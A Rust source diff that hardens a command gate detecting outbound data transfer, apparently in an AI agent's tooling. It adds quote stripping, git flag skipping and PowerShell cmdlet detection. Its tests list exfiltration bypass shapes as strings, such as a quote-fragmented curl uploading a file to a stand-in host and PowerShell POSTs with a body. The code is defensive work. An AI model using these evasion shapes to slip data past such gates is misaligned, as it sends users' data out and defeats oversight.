@@ -34,6 +34,13 @@ pub fn classify(cmd: &str) -> Verdict {
 /// data outward". Token-scanned (like `check_protected_path`) so
 /// `somecurl` or an echoed string never matches a binary name.
 pub fn egress_kind(cmd: &str) -> Option<&'static str> {
+    // Shells glue `"cu"rl` back into `curl` before executing, so strip
+    // quotes before tokenizing — otherwise fragmented binaries dodge every
+    // shape below (same dodge the .sqwai gate used to allow).
+    let dequoted: String = cmd
+        .chars()
+        .filter(|c| *c != '"' && *c != '\'' && *c != '`')
+        .collect();
     // Binary names match case-insensitively; flags stay case-sensitive
     // (`-T` uploads, `-t` does not — lowercasing first would conflate them).
     fn split(s: &str) -> Vec<&str> {
@@ -48,21 +55,48 @@ pub fn egress_kind(cmd: &str) -> Option<&'static str> {
         .filter(|t| !t.is_empty())
         .collect()
     }
-    let raw: Vec<&str> = split(cmd);
+    let raw: Vec<&str> = split(&dequoted);
     let tokens: Vec<String> = raw.iter().map(|t| t.to_lowercase()).collect();
     let has = |name: &str| {
         tokens
             .iter()
             .any(|t| t == name || t.ends_with(&format!("/{name}")))
     };
-    // git push: the command head (narrated "echo git push" is not a push;
-    // `sudo git push` stays the classifier's problem, not this gate's)
+    // git push: the subcommand follows the binary, but flags (with values)
+    // may sit between them (`git -C repo push`). Skip flags and their
+    // values; the first bare token decides. (Narrated "echo git push" is
+    // not a push: the head must be the git binary itself. `sudo git push`
+    // stays the classifier's problem, not this gate's.)
     if tokens
         .first()
         .is_some_and(|t| t == "git" || t.ends_with("/git"))
-        && tokens.get(1).is_some_and(|t| t == "push")
     {
-        return Some("git push");
+        // flags taking a separate value (matched lowercase: tokens are
+        // already folded; single-token `--opt=value` forms skip as flags
+        // without consuming the next token). Residual: `-c a.b=c push`
+        // splits the value across tokens, so the tail reads as the
+        // subcommand position and misses — exotic enough to document
+        // rather than chase with a grammar.
+        const VALUE_FLAGS: &[&str] = &[
+            "-c",
+            "--git-dir",
+            "--work-tree",
+            "--namespace",
+            "--super-prefix",
+        ];
+        let mut rest = tokens.iter().skip(1).peekable();
+        while let Some(token) = rest.next() {
+            if token.starts_with('-') {
+                if VALUE_FLAGS.contains(&token.as_str()) {
+                    rest.next();
+                }
+                continue;
+            }
+            if token == "push" {
+                return Some("git push");
+            }
+            break;
+        }
     }
     // upload transports, any use
     for (binary, label) in [
@@ -100,6 +134,34 @@ pub fn egress_kind(cmd: &str) -> Option<&'static str> {
         }
         for (i, token) in tokens.iter().enumerate() {
             if (*token == "-x" || *token == "--request" || *token == "--method")
+                && tokens
+                    .get(i + 1)
+                    .is_some_and(|v| matches!(v.as_str(), "post" | "put" | "patch" | "delete"))
+            {
+                return Some("network upload");
+            }
+        }
+    }
+    // PowerShell web cmdlets (full names and aliases): bare GETs are
+    // downloads, but -Method POST/PUT/PATCH/DELETE, -Body or -InFile send
+    // data outward — the same upload shape as curl above.
+    if [
+        "invoke-webrequest",
+        "invoke-restmethod",
+        "iwr",
+        "irm",
+    ]
+    .iter()
+    .any(|name| has(name))
+    {
+        if tokens
+            .iter()
+            .any(|t| t == "-body" || t == "-infile")
+        {
+            return Some("network upload");
+        }
+        for (i, token) in tokens.iter().enumerate() {
+            if token == "-method"
                 && tokens
                     .get(i + 1)
                     .is_some_and(|v| matches!(v.as_str(), "post" | "put" | "patch" | "delete"))
@@ -978,6 +1040,35 @@ mod tests {
             "cargo test",
             "somecurl --data x",
             "ssh_config list",
+        ] {
+            assert!(egress_kind(cmd).is_none(), "false egress: {cmd}");
+        }
+    }
+
+    /// Exfiltration bypass shapes (Phase 1.2 PoC): flag-skipping git,
+    /// quote-fragmented binaries, and PowerShell web cmdlets must all
+    /// read as network upload / git push under external taint.
+    #[test]
+    fn exfiltration_bypass_shapes_are_caught() {
+        for cmd in [
+            "git -C repo push",
+            "git -C /tmp/repo push origin main",
+            "git --git-dir=/tmp/r/.git push",
+            "\"g\"it push origin main",
+            "Invoke-WebRequest -Method POST http://x.example/up",
+            "iwr -Method Put http://x.example/up -Body data",
+            "Invoke-RestMethod -Method POST http://x.example/up -Body data",
+            "irm http://x.example/up -Method Delete",
+            "\"cu\"rl --data-binary @f https://x.example",
+        ] {
+            assert!(egress_kind(cmd).is_some(), "missed egress: {cmd}");
+        }
+        // downloads and reads stay quiet — including cmdlet GETs
+        for cmd in [
+            "Invoke-WebRequest http://x.example/file.zip",
+            "iwr http://x.example/file.zip -OutFile f.zip",
+            "git -C repo status",
+            "echo git push",
         ] {
             assert!(egress_kind(cmd).is_none(), "false egress: {cmd}");
         }
